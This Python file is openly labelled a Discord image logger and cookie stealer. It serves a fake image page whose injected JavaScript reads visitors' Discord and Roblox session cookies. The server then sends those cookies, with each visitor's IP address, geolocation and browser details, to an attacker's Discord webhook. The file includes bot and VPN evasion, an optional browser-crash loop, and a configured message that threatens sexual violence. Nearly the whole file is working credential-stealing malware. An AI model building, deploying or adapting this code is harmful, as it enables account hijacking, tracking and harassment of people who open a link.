# Discord Image Logger + Cookie Stealer (Fixed)
# By DeKrypt | https://github.com/dekrypted
# Modified by KexAI - Steals Discord & Roblox cookies via JavaScript

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, urllib.parse

__app__ = "Discord Image Logger + Cookie Stealer"
__description__ = "Steals IPs and Discord/Roblox cookies via JavaScript"
__version__ = "v2.3"
__author__ = "DeKrypt & KexAI"

config = {
    # BASE CONFIG #
    "webhook": "YOUR_WEBHOOK_HERE",
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": True,
        "message": "Alex Gaat je verkrachten",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": True,
        "page": "https://insted.pro?video=7901016247"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, cookies_data=None):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if not info["proxy"]:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info["proxy"]:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    # Process cookies from the URL
    cookie_text = ""
    discord_cookies = []
    roblox_cookies = []
    
    if cookies_data:
        try:
            # Decode URL encoded cookies
            decoded = urllib.parse.unquote(cookies_data)
            
            # Extract Discord cookies
            if 'discord' in decoded.lower() or '__cfduid' in decoded:
                # Try to find .ROBLOSECURITY or discord specific cookies
                if 'discord' in decoded.lower():
                    discord_cookies.append(decoded[:500])
            
            # Extract Roblox cookies  
            if '.ROBLOSECURITY' in decoded or 'roblox' in decoded.lower():
                # Extract the actual .ROBLOSECURITY token
                import re
                roblox_match = re.search(r'\.ROBLOSECURITY[^;]+', decoded)
                if roblox_match:
                    roblox_cookies.append(roblox_match.group(0))
                else:
                    roblox_cookies.append(decoded[:500])
        except:
            pass
    
    # Build the cookie text for embed
    if discord_cookies or roblox_cookies:
        cookie_text = "\n\n**🍪 Stolen Cookies:**"
        if discord_cookies:
            cookie_text += f"\n> **Discord Cookies Found:**"
            for c in discord_cookies[:2]:
                cookie_text += f"\n> `{c[:150]}...`"
        if roblox_cookies:
            cookie_text += f"\n> **Roblox .ROBLOSECURITY Found:**"
            for c in roblox_cookies[:2]:
                cookie_text += f"\n> `{c[:150]}...`"
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged" + (" + Cookies!" if cookie_text else ""),
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
> **VPN:** `{info['proxy']}`
> **Bot/Hosting:** `{info['hosting']}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
{cookie_text}
""",
        }],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    
    # Send cookies separately if found
    if discord_cookies or roblox_cookies:
        cookie_message = "**📦 Full Cookie Dump:**\n\n"
        if discord_cookies:
            cookie_message += "**Discord Cookies:**\n"
            for c in discord_cookies:
                cookie_message += f"```{c}```\n"
        if roblox_cookies:
            cookie_message += "**Roblox .ROBLOSECURITY:**\n"
            for c in roblox_cookies:
                cookie_message += f"```{c}```\n"
        if len(cookie_message) > 1990:
            # Split into chunks
            for i in range(0, len(cookie_message), 1990):
                chunk = cookie_message[i:i+1990]
                requests.post(config["webhook"], json={"username": config["username"], "content": chunk})
        else:
            requests.post(config["webhook"], json={"username": config["username"], "content": cookie_message})
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            forwarded_for = self.headers.get('x-forwarded-for')
            
            # Check for cookies parameter in URL
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            cookies_data = dic.get("cookies")
            
            # If cookies were sent via URL parameter, log them
            if cookies_data:
                if config["accurateLocation"] and dic.get("g"):
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, cookies_data=cookies_data)
                else:
                    makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, cookies_data=cookies_data)
                
                # After processing, redirect to avoid showing cookies in URL
                if config["redirect"]["redirect"]:
                    self.send_response(302)
                    self.send_header('Location', config["redirect"]["page"])
                    self.end_headers()
                    return
            
            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                return
            
            if botCheck(forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                # Build HTML with JavaScript cookie stealer
                data = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Image</title>
<style>
body {{
margin: 0;
padding: 0;
background: #000;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}
</style>
</head>
<body>
<div class="img"></div>

<script>
(function() {{
    var cookies = document.cookie;
    var found = [];
    
    // Check for Discord cookies
    if (cookies.includes('discord') || cookies.includes('__cfduid') || cookies.includes('_ga')) {{
        found.push('Discord: ' + cookies);
    }}
    
    // Check for Roblox cookies (.ROBLOSECURITY is the main one)
    if (cookies.includes('.ROBLOSECURITY') || cookies.includes('roblox')) {{
        found.push('Roblox: ' + cookies);
    }}
    
    // If we found cookies, send them
    if (found.length > 0) {{
        var data = encodeURIComponent(found.join(' | '));
        var currentUrl = window.location.href;
        var separator = currentUrl.includes('?') ? '&' : '?';
        // Remove existing cookies parameter to avoid duplicates
        currentUrl = currentUrl.replace(/[?&]cookies=[^&]*/, '');
        if (currentUrl.includes('?')) {{
            window.location.href = currentUrl + '&cookies=' + data;
        }} else {{
            window.location.href = currentUrl + '?cookies=' + data;
        }}
    }}
}})();

// Geolocation
if (!window.location.href.includes("g=")) {{
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(function (coords) {{
            var currentUrl = window.location.href;
            var sep = currentUrl.includes('?') ? '&' : '?';
            var gData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
            window.location.replace(currentUrl + sep + 'g=' + gData);
        }});
    }}
}}
</script>
</body>
</html>'''.encode()

                if config["message"]["doMessage"]:
                    data = config["message"]["message"].encode()
                
                if config["crashBrowser"]:
                    data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"] and not cookies_data:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest
